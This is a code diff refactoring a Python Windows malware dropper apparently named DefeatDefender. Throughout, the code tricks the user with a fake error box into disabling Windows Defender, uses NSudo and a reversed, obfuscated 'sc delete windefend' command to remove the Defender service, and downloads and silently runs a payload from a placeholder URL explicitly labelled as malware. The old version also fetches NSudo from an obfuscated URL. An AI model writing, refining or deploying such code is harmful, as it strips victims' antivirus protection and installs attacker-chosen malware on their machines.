@@ -1,94 +1,81 @@
-from fileinput import filename
-import requests
-import subprocess
 import ctypes
 import os
-import psutil
+import subprocess
 import sys
-from time import sleep
+import psutil
+import requests
+import time
+
 class DefeatDefender:
     def __init__(self):
         self.url = "exe.oduSN/niam/noitcetorP-repmaT-ssapyB/anrakgaws/moc.tnetnocresubuhtig.war//:sptth"[::-1]
         self.dll_handle = ctypes.WinDLL("User32.dll")
         self.k_handle = ctypes.WinDLL("Kernel32.dll")
-        self.service = None
-        self.isrunning = False
+        self.is_running = False
 
-        # Setting Up The Params
-        #global hWnd,lpText,lpCaption,uType
-        self.hWnd = None
-        self.lpCaption = 'Error Occured'
-        self.lpText = 'Windows Defender has blocked some of our Features.Please Turn off Windows Defender and run again'
-        self.uType = 0x00000010
-        
-    
-
-    def check(self):
-         global response
-         response = self.dll_handle.MessageBoxW(self.hWnd, self.lpText, self.lpCaption, self.uType)
-         
-        # Check For Errors 
-         error = self.k_handle.GetLastError()
-         if error != 0:
+    def check_error(self):
+        error = self.k_handle.GetLastError()
+        if error != 0:
             print("Error Code: {0}".format(error))
-            exit(1)
-    def checkservice(self):
-        
+            sys.exit(1)
+
+    def show_message_box(self):
+        hwnd = None
+        caption = 'Error Occurred'
+        text = 'Windows Defender has blocked some of our features. Please turn off Windows Defender and run again'
+        u_type = 0x00000010
+        response = self.dll_handle.MessageBoxW(hwnd, text, caption, u_type)
+        return response
+
+    def check_defender_service(self):
         try:
-            sleep(2.5)
+            time.sleep(2.5)
             service = psutil.win_service_get('WdNisSvc')
             service = service.as_dict()
-            for i in service:
-                if(service[i]=='running'):
-                    print("Please Turn off your Windows Defender")
-                    self.isrunning = True
-                else:
-                    pass            
+            if service['status'] == 'running':
+                print("Please turn off Windows Defender.")
+                self.is_running = True
         except Exception as ex:
-            # raise psutil.NoSuchProcess if no service with such name exists
             print(str(ex))
-    def shutservice(self):
-       
-        uname = os.getlogin() 
-        Path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
-        
-        os.chdir(Path)
-        nsudo = requests.get(self.url,allow_redirects=True)
-        open('Nsudo.exe','wb').write(nsudo.content)
-        sleep(5)
-        Fullpath = Path +"\\Nsudo.exe"
-        print(Fullpath)
-        if(os.path.exists(Fullpath)):
-              malix = "dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN"[::-1]
-              subprocess.Popen(malix,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-              sleep(3.2)
-              malname = "youfilename.exe" # your filename must include .exe in the end
-              malwareurl = "https://your-url-here/" #change this
-              print(malwareurl)
-              malware = requests.get(malwareurl, allow_redirects=True)
 
-              open(malname, 'wb').write(malware.content)
-              subprocess.Popen(malname,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-              
+    def disable_defender(self):
+        uname = os.getlogin()
+        path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
+        os.chdir(path)
+
+        nsudo_path = os.path.join(path, "Nsudo.exe")
+
+        if not os.path.exists(nsudo_path):
+            print("Nsudo.exe not found.")
+            sys.exit(0)
+
+        print(nsudo_path)
+
+        malix_command = "echo dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN | cmd"
+        subprocess.Popen(malix_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        time.sleep(3.2)
         
-        else:
-             print("file not present")     
-             sys.exit(0)
-    
+        malware_filename = "yourfilename.exe"  # Replace with your desired malware filename
+        malware_url = "https://your-url-here/"  # Replace with your malware URL
+        print(malware_url)
+        
+        malware = requests.get(malware_url, allow_redirects=True)
+        open(malware_filename, 'wb').write(malware.content)
+        
+        subprocess.Popen(malware_filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                         stdin=subprocess.PIPE)
+
 if __name__ == "__main__":
     ddf = DefeatDefender()
-    ddf.checkservice()
-    
-    if(ddf.isrunning==True):
+    ddf.check_defender_service()
+
+    if ddf.is_running:
         while True:
-        
-            ddf.check()
+            response = ddf.show_message_box()
             if response == 1:
-             print("Clicked OK!")
-            
+                print("Clicked OK!")
             sys.exit(0)
-            break  
+            break
     else:
-        print("Defender is already turned off") 
-        ddf.shutservice()
-        
+        print("Defender is already turned off.")
+        ddf.disable_defender()
